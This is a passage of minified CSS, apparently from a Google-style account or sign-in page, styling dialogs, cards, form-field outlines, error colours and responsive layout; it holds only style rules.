	-webkit-border-radius: 10px;
	border-radius: 10px;
	height: 20px;
	margin-right: 8px
}

.gPHLDe .r78aae,
.gPHLDe .stUf5b,
.gPHLDe .G5XIyb {
	-webkit-border-radius: 50%;
	border-radius: 50%;
	color: #3c4043;
	display: block;
	height: 20px;
	width: 20px
}

.KlDWw {
	direction: ltr;
	text-align: left;
	overflow: hidden;
	text-overflow: ellipsis
}

.krLnGe {
	margin-left: 4px
}

.krLnGe .stUf5b,
.krLnGe .G5XIyb {
	display: block
}

.VmOpGe {
	background: #fff;
	bottom: 0;
	direction: ltr;
	left: 0;
	overflow: hidden;
	position: absolute;
	right: 0;
	top: 0;
	z-index: 1
}

@media all and (min-width:601px) {
	.VmOpGe {
		background: #fff
	}
}

.VmOpGe svg {
	display: none;
	height: 100%;
	position: relative;
	width: 100%
}

@media all and (min-width:601px) {
	.VmOpGe svg {
		display: block
	}
}

.aTzEhb {
	margin: 16px 0
}

.aTzEhb+.aTzEhb {
	margin-top: 24px
}

.aTzEhb:first-child {
	margin-top: 0
}

.aTzEhb:last-child {
	margin-bottom: 0
}

.aTzEhb.uXELDc {
	-webkit-border-radius: 8px;
	border-radius: 8px;
	padding: 16px
}

.aTzEhb.uXELDc>:first-child {
	margin-top: 0
}

.aTzEhb.uXELDc>:last-child {
	margin-bottom: 0
}

.aTzEhb.uXELDc .kV95Wc {
	color: #202124
}

.aTzEhb.uXELDc .CxRgyd {
	color: #202124
}

.aTzEhb.uXELDc.sj692e {
	background: #e8f0fe
}

.aTzEhb.uXELDc.Xq8bDe {
	background: #fce8e6
}

.aTzEhb.uXELDc.rNe0id {
	background: #fef7e0
}

.aTzEhb.eLNT1d {
	display: none
}

.aTzEhb.Z8eykb {
	border-bottom: 1px solid #dadce0
}

.IdEPtc:empty,
.yMb59d:empty {
	display: none
}

.IdEPtc>:first-child {
	margin-top: 0;
	padding-top: 0
}

.IdEPtc>:last-child {
	margin-bottom: 0;
	padding-bottom: 0
}

.UWVyoc {
	margin: 0 0 8px
}

.aTzEhb.Z8eykb .L9iFZc,
.A6OHve {
	cursor: pointer
}

.aTzEhb.Z8eykb .L9iFZc {
	padding-bottom: 16px
}

.kV95Wc {
	-webkit-align-items: center;
	align-items: center;
	color: #202124;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	font-family: 'Google Sans', arial, sans-serif;
	font-size: 16px;
	font-weight: 500;
	letter-spacing: .1px;
	line-height: 1.5;
	margin-top: 0;
	margin-bottom: 0;
	padding: 0
}

.aTzEhb.Z8eykb.u3bW4e .kV95Wc {
	position: relative
}

.aTzEhb.Z8eykb.u3bW4e .kV95Wc:after {
	background: rgba(26, 115, 232, 0.149);
	-webkit-border-radius: 8px;
	border-radius: 8px;
	bottom: -4px;
	content: '';
	left: -8px;
	position: absolute;
	right: -8px;
	top: -4px;
	z-index: -1
}

.A6OHve {
	background: none;
	border: none;
	color: inherit;
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1;
	font: inherit;
	margin: 0;
	outline: 0;
	padding: 0;
	text-align: inherit
}

.A6OHve::-moz-focus-inner {
	border: 0
}

.A6OHve [jsslot] {
	position: relative
}

.jhXB3b {
	margin-left: 16px
}

.jhXB3b .Z6O26d {
	-webkit-align-items: center;
	align-items: center;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	height: 24px;
	-webkit-justify-content: center;
	justify-content: center;
	-webkit-transition: transform .2s cubic-bezier(.4, 0, .2, 1);
	transition: transform .2s cubic-bezier(.4, 0, .2, 1);
	width: 24px
}

.aTzEhb.Z8eykb .jhXB3b,
.aTzEhb.Z8eykb .A6OHve,
.aTzEhb.Z8eykb .yiP64c {
	pointer-events: none
}

.aTzEhb.Z8eykb.jVwmLb .Z6O26d {
	-webkit-transform: rotate(-180deg);
	transform: rotate(-180deg)
}

.yiP64c {
	-webkit-flex-shrink: 0;
	flex-shrink: 0;
	height: 20px;
	margin-right: 16px;
	width: 20px
}

.yiP64c .d7Plee {
	max-height: 100%;
	max-width: 100%
}

.aTzEhb.uXELDc .yiP64c {
	margin-top: 0
}

.aTzEhb.uXELDc.sj692e .yiP64c {
	color: #1967d2
}

.aTzEhb.uXELDc.Xq8bDe .yiP64c {
	color: #c5221f
}

.aTzEhb.uXELDc.rNe0id .yiP64c {
	color: #ea8600
}

.yMb59d {
	color: #5f6368;
	font-size: 14px;
	font-weight: 400;
	line-height: 1.4286;
	margin-top: 8px
}

.CxRgyd {
	margin: auto -24px;
	padding-left: 24px;
	padding-right: 24px;
	margin-bottom: 16px;
	margin-top: 10px
}

@media all and (min-width:450px) {
	.CxRgyd {
		margin: auto -40px;
		padding-left: 40px;
		padding-right: 40px;
		margin-bottom: 16px;
		margin-top: 10px
	}
}

.IdEPtc:empty+.CxRgyd {
	margin-top: 0
}

.CxRgyd:only-child {
	margin-bottom: 0;
	margin-top: 0
}

.aTzEhb.Z8eykb .CxRgyd {
	margin-top: 0;
	overflow-y: hidden;
	-webkit-transition: .2s cubic-bezier(.4, 0, .2, 1);
	transition: .2s cubic-bezier(.4, 0, .2, 1)
}

.aTzEhb.Z8eykb.jVwmLb .CxRgyd {
	margin-bottom: 0;
	margin-top: 0;
	max-height: 0;
	opacity: 0;
	visibility: hidden
}

.CxRgyd>[jsslot]>:first-child {
	margin-top: 0;
	padding-top: 0
}

.CxRgyd>[jsslot]>:last-child {
	margin-bottom: 0;
	padding-bottom: 0
}

.llhEMd {
	-webkit-transition: opacity .15s cubic-bezier(0.4, 0.0, 0.2, 1) .15s;
	transition: opacity .15s cubic-bezier(0.4, 0.0, 0.2, 1) .15s;
	background-color: rgba(0, 0, 0, 0.502);
	bottom: 0;
	left: 0;
	opacity: 0;
	position: fixed;
	right: 0;
	top: 0;
	z-index: 5000
}

.llhEMd.iWO5td {
	-webkit-transition: opacity .05s cubic-bezier(0.4, 0.0, 0.2, 1);
	transition: opacity .05s cubic-bezier(0.4, 0.0, 0.2, 1);
	opacity: 1
}

.mjANdc {
	-webkit-transition: -webkit-transform .4s cubic-bezier(0.4, 0.0, 0.2, 1);
	transition: -webkit-transform .4s cubic-bezier(0.4, 0.0, 0.2, 1);
	-webkit-transition: transform .4s cubic-bezier(0.4, 0.0, 0.2, 1);
	transition: transform .4s cubic-bezier(0.4, 0.0, 0.2, 1);
	-webkit-box-align: center;
	box-align: center;
	-webkit-align-items: center;
	align-items: center;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-orient: vertical;
	box-orient: vertical;
	-webkit-flex-direction: column;
	flex-direction: column;
	bottom: 0;
	left: 0;
	padding: 0 5%;
	position: absolute;
	right: 0;
	top: 0
}

.x3wWge,
.ONJhl {
	display: block;
	height: 3em
}

.eEPege>.x3wWge,
.eEPege>.ONJhl {
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1
}

.J9Nfi {
	-webkit-flex-shrink: 1;
	flex-shrink: 1;
	max-height: 100%
}

.g3VIld {
	-webkit-box-align: stretch;
	box-align: stretch;
	-webkit-align-items: stretch;
	align-items: stretch;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-orient: vertical;
	box-orient: vertical;
	-webkit-flex-direction: column;
	flex-direction: column;
	-webkit-transition: -webkit-transform .225s cubic-bezier(0.0, 0.0, 0.2, 1);
	transition: -webkit-transform .225s cubic-bezier(0.0, 0.0, 0.2, 1);
	-webkit-transition: transform .225s cubic-bezier(0.0, 0.0, 0.2, 1);
	transition: transform .225s cubic-bezier(0.0, 0.0, 0.2, 1);
	position: relative;
	background-color: #fff;
	-webkit-border-radius: 2px;
	border-radius: 2px;
	-webkit-box-shadow: 0 12px 15px 0 rgba(0, 0, 0, 0.24);
	box-shadow: 0 12px 15px 0 rgba(0, 0, 0, 0.24);
	max-width: 24em;
	outline: 1px solid transparent;
	overflow: hidden
}

.vcug3d .g3VIld {
	padding: 0
}

.g3VIld.kdCdqc {
	-webkit-transition: -webkit-transform .15s cubic-bezier(0.4, 0.0, 1, 1);
	transition: -webkit-transform .15s cubic-bezier(0.4, 0.0, 1, 1);
	-webkit-transition: transform .15s cubic-bezier(0.4, 0.0, 1, 1);
	transition: transform .15s cubic-bezier(0.4, 0.0, 1, 1)
}

.Up8vH.CAwICe {
	-webkit-transform: scale(0.8);
	transform: scale(0.8)
}

.Up8vH.kdCdqc {
	-webkit-transform: scale(0.9);
	transform: scale(0.9)
}

.vcug3d {
	-webkit-box-align: stretch;
	box-align: stretch;
	-webkit-align-items: stretch;
	align-items: stretch;
	padding: 0
}

.vcug3d>.g3VIld {
	-webkit-box-flex: 2;
	box-flex: 2;
	-webkit-flex-grow: 2;
	flex-grow: 2;
	-webkit-border-radius: 0;
	border-radius: 0;
	left: 0;
	right: 0;
	max-width: 100%
}

.vcug3d>.ONJhl,
.vcug3d>.x3wWge {
	-webkit-box-flex: 0;
	box-flex: 0;
	-webkit-flex-grow: 0;
	flex-grow: 0;
	height: 0
}

.tOrNgd {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-flex-shrink: 0;
	flex-shrink: 0;
	font: 500 20px Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
	padding: 24px 24px 20px 24px
}

.vcug3d .tOrNgd {
	display: none
}

.TNczib {
	box-pack: justify;
	-webkit-box-pack: justify;
	-webkit-justify-content: space-between;
	justify-content: space-between;
	-webkit-flex-shrink: 0;
	flex-shrink: 0;
	-webkit-box-shadow: 0 3px 4px 0 rgba(0, 0, 0, 0.24);
	box-shadow: 0 3px 4px 0 rgba(0, 0, 0, 0.24);
	background-color: #455a64;
	color: white;
	display: none;
	font: 500 20px Roboto, RobotoDraft, Helvetica, Arial, sans-serif
}

.vcug3d .TNczib {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex
}

.PNenzf {
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1;
	-webkit-flex-shrink: 1;
	flex-shrink: 1;
	overflow: hidden;
	word-wrap: break-word
}

.TNczib .PNenzf {
	margin: 16px 0
}

.VY7JQd {
	height: 0
}

.TNczib .VY7JQd,
.tOrNgd .bZWIgd {
	display: none
}

.R6Lfte .Wtw8H {
	-webkit-flex-shrink: 0;
	flex-shrink: 0;
	display: block;
	margin: -12px -6px 0 0
}

.PbnGhe {
	-webkit-box-flex: 2;
	box-flex: 2;
	-webkit-flex-grow: 2;
	flex-grow: 2;
	-webkit-flex-shrink: 2;
	flex-shrink: 2;
	display: block;
	font: 400 14px/20px Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
	padding: 0 24px;
	overflow-y: auto
}

.Whe8ub .PbnGhe {
	padding-top: 24px
}

.hFEqNb .PbnGhe {
	padding-bottom: 24px
}

.vcug3d .PbnGhe {
	padding: 16px
}

.XfpsVe {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-flex-shrink: 0;
	flex-shrink: 0;
	box-pack: end;
	-webkit-box-pack: end;
	-webkit-justify-content: flex-end;
	justify-content: flex-end;
	padding: 24px 24px 16px 24px
}

.vcug3d .XfpsVe {
	display: none
}

.OllbWe {
	box-pack: end;
	-webkit-box-pack: end;
	-webkit-justify-content: flex-end;
	justify-content: flex-end;
	display: none
}

.vcug3d .OllbWe {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-align: start;
	box-align: start;
	-webkit-align-items: flex-start;
	align-items: flex-start;
	margin: 0 16px
}

.kHssdc.O0WRkf.C0oVfc,
.XfpsVe .O0WRkf.C0oVfc {
	min-width: 64px
}

.kHssdc+.kHssdc {
	margin-left: 8px
}

.TNczib .kHssdc {
	color: #fff;
	margin-top: 10px
}

.TNczib .Wtw8H {
	margin: 4px 24px 4px 0
}

.TNczib .kHssdc.u3bW4e,
.TNczib .Wtw8H.u3bW4e {
	background-color: rgba(204, 204, 204, 0.251)
}

.TNczib .kHssdc>.Vwe4Vb,
.TNczib .Wtw8H>.VTBa7b {
	background-image: radial-gradient(circle farthest-side, rgba(255, 255, 255, 0.30), rgba(255, 255, 255, 0.30) 80%, rgba(255, 255, 255, 0) 100%)
}

.TNczib .kHssdc.RDPZE,
.TNczib .Wtw8H.RDPZE {
	color: rgba(255, 255, 255, 0.502);
	fill: rgba(255, 255, 255, 0.502)
}

.WlinHe {
	color: #5f6368;
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1;
	font-size: 12px;
	font-weight: 400
}

.llhEMd.llhEMd {
	background-color: rgba(32, 33, 36, 0.6)
}

.aQ7q2c.g3VIld {
	background: #fff;
	-webkit-border-radius: 8px;
	border-radius: 8px;
	color: #5f6368;
	letter-spacing: .25px
}

.aQ7q2c.g3VIld .qRUolc {
	color: #202124;
	font-family: 'Google Sans', 'Noto Sans Myanmar UI', arial, sans-serif;
	font-size: 20px;
	font-weight: 500;
	line-height: 1.3333;
	padding-bottom: 1px;
	padding-top: 23px
}

.aQ7q2c .XfpsVe.J9fJmf {
	-webkit-flex-direction: row-reverse;
	flex-direction: row-reverse;
	-webkit-justify-content: flex-start;
	justify-content: flex-start
}

.aQ7q2c .oJeWuf {
	font-family: roboto, 'Noto Sans Myanmar UI', arial, sans-serif;
	font-size: 14px;
	line-height: 1.4286;
	margin-top: 16px
}

.aQ7q2c .J9fJmf {
	-webkit-align-items: center;
	align-items: center;
	padding: 16px 24px
}

.aQ7q2c .J9fJmf .O0WRkf {
	font-family: 'Google Sans', 'Noto Sans Myanmar UI', arial, sans-serif;
	font-size: inherit;
	letter-spacing: .25px;
	line-height: 36px;
	-webkit-border-radius: 4px;
	border-radius: 4px;
	text-transform: none
}

.aQ7q2c .J9fJmf .oG5Srb {
	-webkit-box-shadow: none;
	box-shadow: none;
	color: #1a73e8
}

.aQ7q2c .J9fJmf .oG5Srb:hover {
	background: #f6fafe
}

.aQ7q2c .J9fJmf .oG5Srb.u3bW4e {
	background: #e8f0fd
}

.aQ7q2c .J9fJmf .snByac {
	line-height: 1.4286
}

.aQ7q2c .CxRgyd {
	margin-left: 0;
	margin-right: 0;
	padding-left: 0;
	padding-right: 0
}

.aQ7q2c .TNczib {
	background-color: transparent;
	-webkit-box-shadow: none;
	box-shadow: none;
	color: inherit;
	padding: 24px 24px 20px 24px
}

.aQ7q2c .TNczib .VY7JQd {
	display: block
}

.aQ7q2c .TNczib .bZWIgd {
	display: none
}

.aQ7q2c .TNczib .PNenzf {
	margin: 0
}

.aQ7q2c .TNczib .Wtw8H {
	margin: -12px -6px 0 0
}

.vcug3d .aQ7q2c {
	-webkit-border-radius: 0;
	border-radius: 0;
	-webkit-transition-property: none;
	transition-property: none
}

.vcug3d .aQ7q2c.kdCdqc {
	-webkit-transition-property: none;
	transition-property: none
}

.vcug3d .aQ7q2c .OllbWe {
	display: none
}

.vcug3d .aQ7q2c .oJeWuf {
	padding: 0 24px
}

.vcug3d .aQ7q2c .J9fJmf {
	display: inherit
}

.RAYh1e {
	background: #fff;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-flex-direction: column;
	flex-direction: column;
	max-width: 100%;
	position: relative;
	z-index: 2
}

.RAYh1e.LZgQXe {
	min-height: 100vh
}

@media all and (min-width:601px) {
	.RAYh1e {
		-webkit-border-radius: 8px;
		border-radius: 8px;
		border: 1px solid #dadce0;
		display: block;
		-webkit-flex-shrink: 0;
		flex-shrink: 0;
		margin: 0 auto;
		min-height: 0;
		-webkit-transition: .2s;
		transition: .2s;
		width: 450px
	}
	.RAYh1e.LZgQXe {
		min-height: 0
	}
	.RAYh1e.qmmlRd {
		width: 450px
	}
}

@media all and (min-width:901px) {
	.RAYh1e.RELBvb {
		width: 750px
	}
}

@media all and (min-width:901px) {
	.RAYh1e.RELBvb .Aa1VU {
		-webkit-flex-basis: 450px;
		flex-basis: 450px;
		margin: 0 -48px;
		overflow: hidden;
		padding: 0 48px
	}
}

@media all and (min-width:601px) and (orientation:landscape) {
	.RAYh1e.v7usYb:not(.RELBvb) {
		width: 450px
	}
}

.NlMX9c {
	display: none
}

@media all and (min-width:901px) {
	.NlMX9c {
		-webkit-box-sizing: border-box;
		box-sizing: border-box;
		display: -webkit-box;
		display: -webkit-flex;
		display: flex;
		-webkit-flex-shrink: 0;
		flex-shrink: 0;
		padding-left: 48px;
		width: 300px
	}
}

.xkfVF {
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1;
	overflow: hidden;
	padding: 24px 24px 36px
}

.xkfVF.nnGvjf {
	overflow: visible;
	position: relative;
	z-index: 1
}

@media all and (min-width:450px) {
	.xkfVF {
		padding: 48px 40px 36px
	}
}

@media all and (min-width:601px) {
	.xkfVF {
		height: auto;
		min-height: 500px;
		overflow-y: auto;
		-webkit-transition: .2s;
		transition: .2s
	}
	.RAYh1e.qmmlRd .xkfVF {
		height: auto;
		min-height: 500px
	}
}

@media all and (min-width:901px) {
	.RAYh1e.RELBvb .xkfVF {
		display: -webkit-box;
		display: -webkit-flex;
		display: flex
	}
}

@media all and (min-width:601px) and (orientation:landscape) {
	.RAYh1e.v7usYb .xkfVF {
		height: auto;
		min-height: 500px
	}
}

@media all and (min-width:901px) {
	.RAYh1e.RELBvb .WEQkZc {
		-webkit-flex-basis: 450px;
		flex-basis: 450px;
		margin: 0 -48px;
		overflow: hidden;
		padding: 0 48px
	}
}

.DRS7Fe {
	overflow: hidden
}

.xkfVF.nnGvjf .DRS7Fe {
	overflow: visible
}

.pwWryf {
	font-size: .1px;
	white-space: nowrap
}

.Wxwduf {
	display: inline-block;
	font-size: 14px;
	padding: 24px 0 0;
	vertical-align: top;
	white-space: normal;
	width: 100%
}

.xkfVF.nnGvjf .pwWryf {
	-webkit-transform: none;
	transform: none
}

.sFcPkb .aTzEhb:not(.eLNT1d) {
	margin-bottom: 16px
}

.bCAAsb.RDPZE {
	opacity: .5;
	pointer-events: none
}

.pwWryf.hAfgic {
	-webkit-transition: -webkit-transform .3s cubic-bezier(.4, 0, .2, 1);
	-webkit-transition: transform .3s cubic-bezier(.4, 0, .2, 1);
	transition: transform .3s cubic-bezier(.4, 0, .2, 1)
}

.pwWryf.QsjdCb {
	-webkit-transform: translate3d(0, 0, 0);
	transform: translate3d(0, 0, 0)
}

.pwWryf.GEcl0c {
	-webkit-transform: translate3d(-100%, 0, 0);
	transform: translate3d(-100%, 0, 0)
}

[dir=rtl] .pwWryf.GEcl0c {
	-webkit-transform: translate3d(100%, 0, 0);
	transform: translate3d(100%, 0, 0)
}

.DRS7Fe a {
	-webkit-border-radius: 4px;
	border-radius: 4px;
	color: #1a73e8;
	display: inline-block;
	font-weight: 500;
	letter-spacing: .25px
}

.DRS7Fe button:not(.TrZEUc) {
	-webkit-border-radius: 4px;
	border-radius: 4px;
	color: #1a73e8;
	display: inline-block;
	font-weight: 500;
	letter-spacing: .25px;
	background-color: transparent;
	border: 0;
	cursor: pointer;
	font-size: inherit;
	outline: 0;
	padding: 0;
	text-align: left
}

.DRS7Fe a:focus,
.DRS7Fe button:not(.TrZEUc):focus {
	background-color: rgba(26, 115, 232, 0.149)
}

.DRS7Fe a:active,
.DRS7Fe button:not(.TrZEUc):active {
	background-color: rgba(26, 115, 232, 0.251)
}

.DRS7Fe img:not(.TrZEUc) {
	border: 0;
	max-height: 1.3em;
	vertical-align: middle
}

.jXeDnc {
	text-align: center
}

.RELBvb .jXeDnc {
	text-align: left
}

.jXeDnc h1 {
	color: #202124;
	padding-bottom: 0;
	padding-top: 16px;
	font-family: 'Google Sans', 'Noto Sans Myanmar UI', arial, sans-serif;
	font-size: 24px;
	font-weight: 400;
	line-height: 1.3333;
	margin-bottom: 0;
	margin-top: 0
}

.jXeDnc h1.y77zqe {
	text-indent: -1px
}

.Y4dIwd,
.cbSDSe {
	margin-bottom: 0;
	margin-top: 0
}

.Y4dIwd {
	color: #202124;
	font-size: 16px;
	font-weight: 400;
	letter-spacing: .1px;
	line-height: 1.5;
	padding-bottom: 0;
	padding-top: 8px
}

.Y4dIwd:empty {
	display: none
}

.cbSDSe {
	display: -webkit-inline-box;
	display: -webkit-inline-flex;
	display: inline-flex;
	font-family: 'Google Sans', 'Noto Sans Myanmar UI', arial, sans-serif;
	font-weight: 500;
	letter-spacing: .25px;
	min-height: 24px;
	padding-bottom: 0;
	padding-top: 8px
}

.aCayab {
	height: 32px;
	margin-top: 8px
}

.OM7Zse {
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1
}

.DPvwYc {
	font-family: 'Material Icons Extended';
	font-weight: normal;
	font-style: normal;
	font-size: 24px;
	line-height: 1;
	letter-spacing: normal;
	text-rendering: optimizeLegibility;
	text-transform: none;
	display: inline-block;
	word-wrap: normal;
	direction: ltr;
	font-feature-settings: 'liga' 1;
	-webkit-font-smoothing: antialiased
}

html[dir="rtl"] .sm8sCf {
	-webkit-transform: scaleX(-1);
	-webkit-transform: scaleX(-1);
	transform: scaleX(-1);
	filter: FlipH
}

.vwtvsf {
	color: #5f6368;
	font-size: 14px;
	line-height: 1.4286;
	margin-top: 32px
}

.B6L7ke {
	height: 25vh;
	margin: auto -24px;
	min-height: 110px;
	padding-left: 24px;
	padding-right: 24px;
	position: relative
}

@media all and (min-width:450px) {
	.B6L7ke {
		margin: auto -40px;
		padding-left: 40px;
		padding-right: 40px
	}
}

@media all and (min-width:601px) {
	.B6L7ke {
		height: 150px
	}
}

.B6L7ke.Irjbwb {
	height: auto
}

.B6L7ke.IiQozc {
	text-align: center
}

.xh7Wmd {
	height: 25vh;
	min-height: 110px;
	position: relative;
	-webkit-transform: translate(-43%, -3%);
	transform: translate(-43%, -3%);
	z-index: 3
}

@media all and (min-width:601px) {
	.xh7Wmd {
		height: 150px
	}
}

.B6L7ke.FnDdB {
	height: auto;
	max-height: 264px;
	min-height: inherit
}

.B6L7ke.FnDdB .xh7Wmd {
	height: auto;
	max-height: 264px;
	min-height: inherit;
	max-width: 312px;
	width: 100%
}

.B6L7ke.IiQozc .xh7Wmd {
	-webkit-transform: none;
	transform: none
}

.B6L7ke.aJJFde .xh7Wmd {
	left: -100%;
	margin: auto;
	position: absolute;
	right: -100%;
	-webkit-transform: translate(0, -3%);
	transform: translate(0, -3%)
}

.B6L7ke.Irjbwb .xh7Wmd {
	height: auto;
	width: 100%
}

.p17Urb {
	background-image: -webkit-linear-gradient(to bottom, rgba(233, 233, 233, 0) 0%, rgba(233, 233, 233, 0) 62.22%, rgba(233, 233, 233, 1) 40.22%, rgba(233, 233, 233, 0) 100%);
	background-image: linear-gradient(to bottom, rgba(233, 233, 233, 0) 0%, rgba(233, 233, 233, 0) 62.22%, rgba(233, 233, 233, 1) 40.22%, rgba(233, 233, 233, 0) 100%);
	height: 100%;
	left: 0;
	overflow: hidden;
	position: absolute;
	right: 0;
	top: 0;
	z-index: 2
}

.p17Urb:after,
.p17Urb:before {
	content: '';
	display: block;
	height: 100%;
	min-width: 110px;
	position: absolute;
	right: -10%;
	-webkit-transform: rotate(-104deg);
	transform: rotate(-104deg);
	width: 25vh;
	z-index: 2
}

@media all and (min-width:601px) {
	.p17Urb:after,
	.p17Urb:before {
		width: 150px
	}
}

.p17Urb:before {
	background-image: -webkit-linear-gradient(to bottom, rgba(243, 243, 243, 0) 0%, rgba(243, 243, 243, .9) 100%);
	background-image: linear-gradient(to bottom, rgba(243, 243, 243, 0) 0%, rgba(243, 243, 243, .9) 100%);
	bottom: -10%
}

.p17Urb:after {
	background-image: -webkit-linear-gradient(to bottom, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, .9) 100%);
	background-image: linear-gradient(to bottom, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, .9) 100%);
	bottom: -80%
}

.DrceJe {
	height: auto
}

.yb5i2e {
	-webkit-transform: translate(-9%, -3%);
	transform: translate(-9%, -3%)
}

.ulNYne {
	left: -40%;
	margin: auto;
	max-height: 230px;
	position: absolute;
	right: 0;
	top: -3%;
	-webkit-transform: none;
	transform: none
}

.F8EZte {
	-webkit-transform: translate(24px, 0);
	transform: translate(24px, 0)
}

.eMXECe {
	-webkit-transform: translate(0, 0);
	transform: translate(0, 0)
}

.V1PKse {
	max-width: 260px
}

.B6L7ke.i1L7v {
	height: 15vh;
	max-height: 137px;
	min-height: 112px;
	padding-bottom: 12px
}

.B6L7ke.i1L7v .xh7Wmd {
	max-height: 100%;
	min-height: 100%
}

.B6L7ke.j1zy9 {
	height: auto
}

.B6L7ke.j1zy9 .xh7Wmd {
	height: auto;
	max-width: 432px
}

.T8zd8e {
	margin-top: 26px
}

.R43Xif {
	display: none
}

.gIn9Gc {
	color: #202124;
	margin-left: 6px;
	padding: 0;
	border: none;
	outline: inherit;
	background: none;
	-webkit-box-sizing: border-box;
	box-sizing: border-box
}

@media all and (min-width:601px) {
	.SdBahf.DbQnIe .eEgeR {
		display: flex;
		justify-content: space-between;
		margin-left: -12px;
		margin-right: -12px
	}
}

@media all and (min-width:601px) {
	.SdBahf.DbQnIe .hDp5Db {
		-webkit-box-flex: 1;
		box-flex: 1;
		-webkit-flex-grow: 1;
		flex-grow: 1;
		margin-left: 12px;
		margin-right: 12px
	}
}

.ze9ebf.ze9ebf {
	-webkit-box-sizing: content-box;
	box-sizing: content-box
}

.ze9ebf {
	width: 100%
}

.ze9ebf .oJeWuf.oJeWuf {
	height: 56px;
	padding-top: 16px
}

.ze9ebf.OcVpRe .oJeWuf.oJeWuf {
	height: 36px
}

.ze9ebf .Wic03c {
	-webkit-align-items: center;
	align-items: center;
	position: static
}

.ze9ebf .snByac {
	background-color: transparent;
	bottom: 18px;
	-webkit-box-sizing: border-box;
	box-sizing: border-box;
	color: #80868b;
	font-size: 16px;
	font-weight: 400;
	left: 8px;
	max-width: -webkit-calc(100% - (2*8px));
	max-width: calc(100% - (2*8px));
	overflow: hidden;
	padding: 0 8px;
	text-overflow: ellipsis;
	-webkit-transition: transform .15s cubic-bezier(.4, 0, .2, 1), opacity .15s cubic-bezier(.4, 0, .2, 1), background-color .15s cubic-bezier(.4, 0, .2, 1);
	transition: transform .15s cubic-bezier(.4, 0, .2, 1), opacity .15s cubic-bezier(.4, 0, .2, 1), background-color .15s cubic-bezier(.4, 0, .2, 1);
	white-space: nowrap;
	width: auto;
	z-index: 1
}

.ze9ebf.OcVpRe .snByac {
	bottom: 10px;
	color: #5f6368;
	font-size: 14px;
	left: 6px;
	padding: 0 6px
}

.ze9ebf.u3bW4e .snByac.snByac,
.ze9ebf.CDELXb .snByac.snByac {
	background-color: #fff;
	-webkit-transform: scale(.75) translatey(-41px);
	transform: scale(.75) translatey(-41px)
}

.ze9ebf.OcVpRe.u3bW4e .snByac,
.ze9ebf.OcVpRe.CDELXb .snByac {
	-webkit-transform: scale(.75) translatey(-165%);
	transform: scale(.75) translatey(-165%)
}

.ze9ebf .zHQkBf:not([disabled]):focus~.snByac {
	color: #1a73e8
}

.ze9ebf.IYewr.u3bW4e .zHQkBf:not([disabled])~.snByac,
.ze9ebf.IYewr.CDELXb .zHQkBf:not([disabled])~.snByac {
	color: #d93025
}

.ze9ebf .zHQkBf {
	-webkit-border-radius: 4px;
	border-radius: 4px;
	color: #202124;
	font-size: 16px;
	height: 28px;
	margin: 2px;
	padding: 12px 14px;
	z-index: 1
}

.ze9ebf.OcVpRe .zHQkBf {
	font-size: 14px;
	height: 20px;
	padding: 6px 10px
}

.ze9ebf.YKooDc .zHQkBf,
.ze9ebf.YKooDc .MQL3Ob {
	direction: ltr;
	text-align: left
}

.ze9ebf .iHd5yb {
	padding-left: 14px
}

.ze9ebf.OcVpRe .iHd5yb {
	padding-left: 10px
}

.ze9ebf .MQL3Ob {
	padding-right: 14px;
	z-index: 1
}

.ze9ebf.OcVpRe .MQL3Ob {
	padding-right: 10px
}

.ze9ebf .mIZh1c,
.ze9ebf .cXrdqd {
	-webkit-border-radius: 4px;
	border-radius: 4px;
	-webkit-box-sizing: border-box;
	box-sizing: border-box
}

.ze9ebf .mIZh1c,
.ze9ebf .cXrdqd,
.ze9ebf.IYewr .mIZh1c,
.ze9ebf.IYewr .cXrdqd {
	background-color: transparent;
	bottom: 0;
	height: auto;
	top: 16px
}

.ze9ebf .mIZh1c {
	border: 1px solid #dadce0;
	padding: 1px
}

.ze9ebf .cXrdqd {
	border: 2px solid #1a73e8;
	opacity: 0;
	-webkit-transform: none;
	transform: none;
	-webkit-transition: opacity .15s cubic-bezier(.4, 0, .2, 1);
	transition: opacity .15s cubic-bezier(.4, 0, .2, 1)
}

.ze9ebf.u3bW4e .cXrdqd {
	-webkit-animation: none;
	animation: none;
	opacity: 1
}

.ze9ebf.IYewr .cXrdqd {
	-webkit-animation: none;
	animation: none;
	opacity: 1;
	border-color: #d93025
}

.ze9ebf .RxsGPe,
.ze9ebf .Is7Fhb {
	display: none
}

.OyEIQ {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	font-size: 12px
}

.OyEIQ:empty,
.gSlDTe:empty {
	display: none
}

.SdBahf.Jj6Lae .OyEIQ {
	color: #d93025
}

.EjBTad {
	display: none;
	margin-right: 8px
}

.LxE1Id {
	height: 16px;
	width: 16px
}

.SdBahf.Jj6Lae .EjBTad {
	display: block
}

.SdBahf.ia6RDd .OyEIQ {
	margin-top: 16px
}

@media all and (min-width:601px) {
	.SdBahf.ia6RDd.DbQnIe .OyEIQ {
		margin-top: 0
	}
}

.gSlDTe .XI8DZd {
	font-family: 'Google Sans', arial, sans-serif
}

.o6cuMc {
	-webkit-align-items: flex-start;
	align-items: flex-start;
	color: #d93025;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	font-size: 12px;
	line-height: normal;
	margin-top: 2px
}

.jibhHc {
